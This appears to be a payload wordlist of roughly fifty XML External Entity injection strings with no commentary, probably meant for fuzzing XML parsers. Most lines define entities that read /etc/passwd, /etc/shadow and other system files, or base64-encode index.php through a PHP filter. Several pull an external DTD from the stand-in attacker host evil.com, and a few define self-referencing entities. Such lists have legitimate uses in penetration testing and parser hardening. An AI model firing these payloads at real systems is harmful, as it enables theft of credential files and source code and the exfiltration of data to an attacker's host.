<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/resolv.conf">]><root>&xxe;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/issue">]><root>&xxe;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://evil.com/xxe_payload.dtd">]><root>&xxe;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><root>&xxe;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/shadow"> %xxe;]><root></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/hosts"> %xxe;]><root></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/hostname"> %xxe;]><root></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/resolv.conf"> %xxe;]><root></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/issue"> %xxe;]><root></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/xxe_payload.dtd"> %xxe;]><root></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"> %xxe;]><root></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe "&xxe;" >]><root></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe "<entity>&xxe;</entity>" >]><root></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe "<!ENTITY &xxe; 'xxe_payload'>" >]><root></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root><name>&xxe;</name></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root><name>&xxe;</name></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root><name>&xxe;</name></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/resolv.conf">]><root><name>&xxe;</name></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/issue">]><root><name>&xxe;</name></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://evil.com/xxe_payload.dtd">]><root><name>&xxe;</name></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><root><name>&xxe;</name></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root PUBLIC "-//OASIS//DTD DITA Topic//EN" "http://evil.com/xxe_payload.dtd"><root>&xxe;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root PUBLIC "-//OASIS//DTD DITA Topic//EN" "http://evil.com/xxe_payload.dtd"><root><name>test</name></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root PUBLIC "-//OASIS//DTD DITA Topic//EN" "http://evil.com/xxe_payload.dtd"><root></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root PUBLIC "-//OASIS//DTD DITA Topic//EN" "http://evil.com/xxe_payload.dtd"><root><name>&xxe;</name></root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/resolv.conf">]><root>&xxe;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/issue">]><root>&xxe;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://evil.com/xxe_payload.dtd">]><root>&xxe;</root>
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><root>&xxe;</root>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/resolv.conf">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/issue">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe_payload.dtd">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo></foo>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/shadow"> %xxe;]><foo></foo>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hosts"> %xxe;]><foo></foo>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname"> %xxe;]><foo></foo>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/resolv.conf"> %xxe;]><foo></foo>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/issue"> %xxe;]><foo></foo>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe_payload.dtd"> %xxe;]><foo></foo>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"> %xxe;]><foo></foo>